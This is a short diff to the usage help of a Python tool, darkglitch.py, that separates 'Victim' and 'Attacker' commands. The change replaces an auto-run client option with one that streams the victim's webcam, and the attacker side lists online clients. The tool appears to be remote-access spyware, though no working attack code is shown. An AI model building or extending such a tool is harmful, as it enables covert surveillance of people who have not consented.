@@ -3,8 +3,8 @@ def help():
     Usage:
 
     Victim:
-        python darkglitch.py -l
-        python darkglitch.py -r
+        python darkglitch.py -l -c
+        python darkglitch.py -l -s
 
     Attacker:
         python darkglitch.py -ol
@@ -17,7 +17,7 @@ def help():
 
     Victim Options:
         -l, --listen          Start the client and wait for connections
-        -r, --run             Automatic start client script  
+        -s, --stream          Stream a webcam the client and wait for connections  
 
     Attacker Options:
         -ol, --online-list    List online clients
